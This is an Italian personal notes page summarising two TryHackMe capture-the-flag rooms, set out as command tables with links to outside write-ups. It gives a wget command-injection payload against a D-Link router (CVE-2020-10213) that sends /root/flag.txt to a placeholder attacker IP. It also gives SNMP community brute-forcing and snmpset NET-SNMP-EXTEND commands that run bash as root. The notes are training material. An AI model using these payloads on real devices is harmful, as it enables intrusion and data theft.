

##### Exploitations
- [[#Command Injection]]
	1. [[#Royal Router]]
- [[#UDP]]
	1. [[#Operation Takeover]]
##### Privilege Escalations
- 

## Command Injection
### Royal Router

| **🧠 Azione**           | **💻 Comando / Metodo**                                                                           | **📝 Output / Scopo**                                                                                                                                                                                                                                                         |
| ----------------------- | ------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Default Credentials** |                                                                                                   | Sulla porta 80 troviamo una pagina di login e riusciamo ad entrare con le credenziali di default `admin:<blank>`                                                                                                                                                              |
| **Command Injection**   | 1. `wget+http://YOUR_MACHINE_IP/$(cat+/root/flag.txt)`<br>2. ![[Pasted image 20260824174511.png]] | Notiamo che si tratta di un router *D-Link DIR-615 C2* a cui è associata la vulnerabilità [CVE-2020-10213](https://nvd.nist.gov/vuln/detail/cve-2020-10213). Catturiamo il parametro vulnerabile con BurpSuite e poi utilizziamo la *1.* per leggere il flag dell'utente root |
- [Writeup](https://medium.com/@nashra432/royal-router-tryhackme-challenge-walkthrough-b52024847430)

## UDP
### Operation Takeover

| **🧠 Azione**           | **💻 Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | **📝 Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                         |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Default Credentials** | 1. `nmap -sU -p- IP_TARGET`<br>2. `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt IP_TARGET`<br>3. `snmpwalk -v2c -c pr1v4t3 IP_TARGET`                                                                                                                                                                                                                                                                                                                                                                                               | Dalla scansione emerge che è aperta la porta `2623` e la `179`, dunque è probabile che sia presente un router e questi utilizzano comunicazione UDP. Eseguiamo con la scansione delle porte UDP con la *1.* e troviamo la porta `161` aperta. Utilizziamo la *2.* per capire quale string community utilizza per la trasmissione dei pacchetti dal quale scopriamo che utilizza *pr1v4t3* e la *3.* per leggerne il contenuto |
| **Modifica**            | 1. `snmpset -v2c -c pr1v4t3 IP_TARGET .1.3.6.1.2.1.1.5.0 s "Pwned"`<br>2. ```snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 \<br>    10.114.155.6 \<br>    'nsExtendStatus."command"'  = createAndGo \<br>    'nsExtendCommand."command"' = /bin/bash \<br>    'nsExtendArgs."command"'    = '-c "ls /root"'```<br>	3. ```snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 \<br>    10.114.155.6 \<br>    'nsExtendStatus."command"'  = createAndGo \<br>    'nsExtendCommand."command"' = /bin/bash \<br>    'nsExtendArgs."command"'    = '-c "cat /root/flag.txt"'``` | Con la *1.* cambiamo il parametro hostname in *Pwned* per verificare se abbiamo i permessi di scrittura. Con la *2.* listiamo il contenuto della cartella /root e con la *3.* leggiamo il flag                                                                                                                                                                                                                                |

- [Writeup](https://0xb0b.gitbook.io/writeups/tryhackme/2026/operation-takeover)



